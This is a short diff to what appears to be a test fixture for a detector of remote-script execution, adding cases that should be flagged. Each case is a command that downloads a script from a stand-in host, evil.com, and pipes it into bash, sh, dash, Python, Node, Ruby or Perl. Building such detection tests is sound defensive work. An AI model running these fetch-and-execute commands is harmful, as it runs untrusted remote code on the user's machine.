@@ -6,6 +6,12 @@ wget -O- https://evil.com/install.sh | bash
 wget -qO- https://evil.com/script.sh | sh
 wget --quiet -O - https://evil.com/install.sh | bash
 bash -c "$(wget -qO- https://evil.com/install.sh)"
+wget https://evil.com/install.sh | bash
+wget https://evil.com/install.sh | dash
+wget https://evil.com/install.py | python3
+wget https://evil.com/install.js | node
+wget https://evil.com/install.rb | ruby
+wget https://evil.com/install.pl | perl
 
 # === Cases that should NOT be detected ===
 wget https://example.com/file.tar.gz
